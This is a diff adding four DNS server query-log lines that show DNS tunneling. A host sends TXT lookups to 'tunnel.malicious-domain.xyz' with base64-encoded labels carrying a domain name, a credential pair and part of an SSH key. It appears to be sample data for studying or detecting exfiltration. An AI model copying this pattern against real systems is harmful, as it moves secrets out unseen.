@@ -1,0 +1,4 @@
+11-May-2026 14:12:01.105 queries: info: client @0x55f9a1b2c3d0 10.0.5.15#51923 (d3d3LnNlY3JldGRhdGEuY29t.tunnel.malicious-domain.xyz): query: d3d3LnNlY3JldGRhdGEuY29t.tunnel.malicious-domain.xyz IN TXT + (10.0.5.1)
+11-May-2026 14:12:01.450 queries: info: client @0x55f9a1b2c3d0 10.0.5.15#51924 (cGFzc3dvcmRzLHRva2VucyE=.tunnel.malicious-domain.xyz): query: cGFzc3dvcmRzLHRva2VucyE=.tunnel.malicious-domain.xyz IN TXT + (10.0.5.1)
+11-May-2026 14:12:01.812 queries: info: client @0x55f9a1b2c3d0 10.0.5.15#51925 (YWRtaW46aHVudGVyMg==.tunnel.malicious-domain.xyz): query: YWRtaW46aHVudGVyMg==.tunnel.malicious-domain.xyz IN TXT + (10.0.5.1)
+11-May-2026 14:12:02.105 queries: info: client @0x55f9a1b2c3d0 10.0.5.15#51926 (c3NoLXJzYSBBQUFBQjNOemFD.tunnel.malicious-domain.xyz): query: c3NoLXJzYSBBQUFBQjNOemFD.tunnel.malicious-domain.xyz IN TXT + (10.0.5.1)
